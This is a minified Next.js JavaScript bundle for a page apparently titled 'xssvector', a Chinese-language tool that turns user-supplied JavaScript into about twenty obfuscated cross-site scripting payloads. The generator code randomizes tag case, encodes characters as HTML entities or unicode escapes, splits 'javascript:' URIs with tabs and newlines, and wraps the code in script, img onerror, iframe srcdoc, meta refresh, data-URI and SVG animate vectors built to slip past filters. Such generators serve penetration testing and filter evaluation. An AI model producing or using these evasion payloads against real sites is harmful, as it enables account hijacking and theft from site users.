(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[5419],{89757:function(e,t,n){(window.__NEXT_P=window.__NEXT_P||[]).push(["/xssvector",function(){return n(46579)}])},43197:function(e,t,n){"use strict";var c=n(85893),o=n(70671),a=n(88613),l=n(47023),r=n(37375),s=n(55343),i=n(51233),u=n(5616),d=n(15861),f=n(25662),m=n(67294);t.Z=e=>{let{children:t,sx:n,fullScreen:x=!0}=e,{path:h}=(0,a.hI)(),[p]=m.useState(r.Z.find(e=>e.path===h));return(0,m.useEffect)(()=>{let e=e=>{if(!(document.fullscreenElement||document.mozFullScreenElement||document.webkitFullscreenElement||document.msFullscreenElement)){let e=document.getElementById("fullscreen-element"),t=document.getElementById("rivers-header");e&&(e.style.position="unset",e.style.inset="0",e.style.maxWidth="unset",e.style.padding="0",t&&(t.style.display="block"))}};return document.addEventListener("fullscreenchange",e),document.addEventListener("webkitfullscreenchange",e),document.addEventListener("mozfullscreenchange",e),document.addEventListener("MSFullscreenChange",e),()=>{document.removeEventListener("fullscreenchange",e),document.removeEventListener("webkitfullscreenchange",e),document.removeEventListener("mozfullscreenchange",e),document.removeEventListener("MSFullscreenChange",e)}},[]),(0,c.jsxs)(i.Z,{sx:{px:"50px",py:2,overflow:"auto",flex:1,borderRadius:"8px",background:"#fff",boxShadow:"0px 0px 2px 0px rgba(145,158,171,0.2), 0px 12px 24px -4px rgba(145,158,171,0.12)",...n},children:[(0,c.jsxs)(i.Z,{direction:"row",justifyContent:"space-between",children:[(0,c.jsx)(u.Z,{children:(0,c.jsx)(d.Z,{sx:{mb:"0px",fontWeight:600,color:o.Z2,fontSize:"20px"},gutterBottom:!0,variant:"subtitle1",component:"div",children:null==p?void 0:p.label})}),(0,c.jsx)(i.Z,{direction:"row",sx:{fontFamily:"Mono"},children:l.i.filter(e=>null==p?void 0:p.tags.includes(e.name)).map(e=>(0,c.jsx)(u.Z,{sx:{height:"24px",lineHeight:"24px",fontSize:"12px",background:"rgba(52,90,255,0.1)",color:"#345AFF",px:1,borderRadius:1,ml:1},children:e.label},e.name))})]}),(0,c.jsxs)(i.Z,{direction:"row",alignItems:"center",justifyContent:"space-between",sx:{position:"relative",width:"100%",alignSelf:"stretch",mb:"24px"},children:[(0,c.jsx)(d.Z,{variant:"caption",sx:{display:"inline-block",maxWidth:"100%",pl:"6px",color:"rgba(11,37,98,0.5)",background:"rgba(11,37,98,0.04)",borderRadius:1,lineHeight:"24px"},children:null==p?void 0:p.subTitle}),x?(0,c.jsx)(f.Z,{size:"small",onClick:()=>{let e=document.body;new Promise(t=>{(null==e?void 0:e.requestFullscreen)?t(e.requestFullscreen()):(null==e?void 0:e.mozRequestFullScreen)?t(null==e?void 0:e.mozRequestFullScreen()):(null==e?void 0:e.webkitRequestFullscreen)?t(null==e?void 0:e.webkitRequestFullscreen()):(null==e?void 0:e.msRequestFullscreen)&&t(null==e?void 0:e.msRequestFullscreen())}).then(()=>{let e=document.getElementById("fullscreen-element"),t=document.getElementById("rivers-header");e&&(e.style.position="fixed",e.style.inset="0",e.style.maxWidth="100vw",e.style.background="#fff",e.style.padding="84px 14px 14px 14px",t&&(t.style.display="none"))})},sx:{borderRadius:"4px",height:"24px"},variant:"outlined",startIcon:(0,c.jsx)(s.Z,{}),children:"全屏"}):null]}),(0,c.jsx)(i.Z,{id:"fullscreen-element",sx:{gap:"18px",maxWidth:"1020px",fontFamily:"Mono",mx:"auto",flex:1,width:"100%"},children:t})]})}},46579:function(e,t,n){"use strict";n.r(t),n.d(t,{default:function(){return b}});var c=n(85893),o=n(43197),a=n(5616),l=n(51233),r=n(86886),s=n(15861),i=n(25662),u=n(26148),d={"hljs-comment":{color:"#d4d0ab"},"hljs-quote":{color:"#d4d0ab"},"hljs-variable":{color:"#ffa07a"},"hljs-template-variable":{color:"#ffa07a"},"hljs-tag":{color:"#ffa07a"},"hljs-name":{color:"#ffa07a"},"hljs-selector-id":{color:"#ffa07a"},"hljs-selector-class":{color:"#ffa07a"},"hljs-regexp":{color:"#ffa07a"},"hljs-deletion":{color:"#ffa07a"},"hljs-number":{color:"#f5ab35"},"hljs-built_in":{color:"#f5ab35"},"hljs-builtin-name":{color:"#f5ab35"},"hljs-literal":{color:"#f5ab35"},"hljs-type":{color:"#f5ab35"},"hljs-params":{color:"#f5ab35"},"hljs-meta":{color:"#f5ab35"},"hljs-link":{color:"#f5ab35"},"hljs-attribute":{color:"#ffd700"},"hljs-string":{color:"#abe338"},"hljs-symbol":{color:"#abe338"},"hljs-bullet":{color:"#abe338"},"hljs-addition":{color:"#abe338"},"hljs-title":{color:"#00e0e0"},"hljs-section":{color:"#00e0e0"},"hljs-keyword":{color:"#dcc6e0"},"hljs-selector-tag":{color:"#dcc6e0"},hljs:{display:"block",overflowX:"auto",background:"#2b2b2b",color:"#f8f8f2",padding:"0.5em"},"hljs-emphasis":{fontStyle:"italic"},"hljs-strong":{fontWeight:"bold"}},f=n(61903),m=n(67294),x=n(69111);function h(e){return e.split("").map(e=>.4>Math.random()?e.toUpperCase():e.toLowerCase()).join("")}function p(e){return e.split("").map(e=>{let t=Math.random();if(":"===e)return"&colon;";if(";"===e)return"&semi;";if("'"===e)return"&apos;";if('"'===e)return"&quot;";if(" "===e)return"&nbsp;";if("<"===e)return"&lt;";if(">"===e)return"&gt;";else if("&"===e)return"&amp;";else if("	"===e)return"&#x09;";else if("\n"===e)return"&#x0a;";else if(t<.1)return"&#".concat(e.charCodeAt(0).toString(),";");else if(t<.2)return"&#x".concat(e.charCodeAt(0).toString(16),";");else return e}).join("")}n(21876).Buffer;var b=()=>{let[e,t]=(0,m.useState)("alert()"),[n,b]=(0,m.useState)("alert()"),[g,j]=(0,m.useState)([]),v=()=>{j(["<".concat(h("script"),">").concat(n.split("").map(e=>.2>Math.random()?"\\u".concat(("0000"+e.charCodeAt(0).toString(16)).slice(-4)):e).join(""),"</").concat(h("script"),">"),"<".concat(h("a")," ").concat(h("href"),'="').concat(p(k()),'">XSS</').concat(h("a"),">"),"<".concat(h("body")," ").concat(h("onload"),'="').concat(p(n),'">'),"<".concat(h("embed")," ").concat(h("src"),'="').concat(p(k()),'">'),"<".concat(h("form")," ").concat(h("action"),'="').concat(p(k()),'"><').concat(h("input")," type=submit value=XSS>"),"<".concat(h("form")," ").concat(h("action"),'="').concat(p(k()),'"><').concat(h("input")," type=submit id=x></form><").concat(h("label")," for=x>XSS</").concat(h("label"),">"),"<".concat(h("form"),"><").concat(h("button")," ").concat(h("formaction"),'="').concat(p(k()),'">XSS</').concat(h("button"),">"),"<".concat(h("form"),"><").concat(h("input")," type=submit ").concat(h("formaction"),'="').concat(p(k()),'" value=XSS>'),"<".concat(h("iframe")," ").concat(h("srcdoc"),'="').concat((0,x.encode)("<img src=1 onerror='")).concat(n,"'>\"></").concat(h("iframe"),">"),"<".concat(h("iframe")," ").concat(h("src"),'="').concat(p(k()),'"></').concat(h("iframe"),">"),"<".concat(h("img")," src=x ").concat(h("onerror"),'="').concat((0,x.encode)(n),'">'),"<".concat(h("meta"),' http-equiv="refresh" content="0; url=').concat(p(k()),'">'),"<".concat(h("object")," ").concat(h("data"),'="').concat(p(k()),'">'),"<".concat(h("script")," ").concat(h("src"),'="data:text/javascript,').concat(n,'"></').concat(h("script"),">"),"<".concat(h("script"),">import('data:text/javascript,").concat(n,"')</").concat(h("script"),">"),"<".concat(h("svg"),"><").concat(h("animate"),' xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values="https://portswigger.net?&semi;').concat(p(k()),'&semi;0" /><a id=xss><text x=20 y=20>XSS</text></a>'),"<".concat(h("svg"),"><").concat(h("a"),' xlink:href="').concat(p(k()),'"><').concat(h("text"),' x="20" y="20">XSS</text></').concat(h("a"),">"),"<".concat(h("svg"),"><").concat(h("animate"),' xlink:href=#xss attributeName=href values="').concat(p(k()),'" /><').concat(h("a")," id=xss><text x=20 y=20>XSS</text></").concat(h("a"),">"),"<".concat(h("svg"),"><").concat(h("animate"),' xlink:href=#xss attributeName=href from="').concat(p(k()),'" to=1 /><').concat(h("a")," id=xss><text x=20 y=20>XSS</text></").concat(h("a"),">"),"<".concat(h("svg"),"><").concat(h("set"),' xlink:href=#xss attributeName=href from=? to="').concat(p(k()),'" /><').concat(h("a")," id=xss><text x=20 y=20>XSS</text></").concat(h("a"),">")])};(0,m.useEffect)(()=>{v()},[]);let y=(0,m.useCallback)(e=>{t(e.target.value),b(e.target.value)},[e]),S=(0,m.useCallback)(t=>{b(e),v()},[n,e]),k=()=>"".concat(h(w("javascript",["	","\n"])),":").concat(n,";"),w=(e,t)=>{let n="";for(let c=0;c<e.length;c++)if(n+=e[c],c<e.length-1){let e=Math.floor(Math.random()*t.length);n+=t[e]}return n};return(0,c.jsx)(o.Z,{children:(0,c.jsx)(a.Z,{sx:{width:"100%",typography:"body1"},children:(0,c.jsxs)(l.Z,{spacing:2,children:[(0,c.jsxs)(r.ZP,{container:!0,children:[(0,c.jsx)(r.ZP,{item:!0,xs:8,children:(0,c.jsx)(s.Z,{variant:"subtitle2",sx:{lineHeight:"36px"},children:"JS 代码"})}),(0,c.jsx)(r.ZP,{item:!0,xs:4,sx:{textAlign:"right"},children:(0,c.jsx)(i.Z,{onClick:S,variant:"contained",children:"生成"})})]}),(0,c.jsx)(f.Z,{value:e,variant:"outlined",multiline:!0,rows:3,onChange:y,sx:{textarea:{fontSize:"14px",fontFamily:"Mono"},marginTop:"6px !important",marginBottom:"30px !important"}}),(0,c.jsx)(s.Z,{variant:"subtitle2",children:"XSS 向量"}),(0,c.jsx)(u.Z,{style:d,children:g.join("\n\n")})]})})})}}},function(e){e.O(0,[8683,1876,9866,9111,9774,2888,179],function(){return e(e.s=89757)}),_N_E=e.O()}]);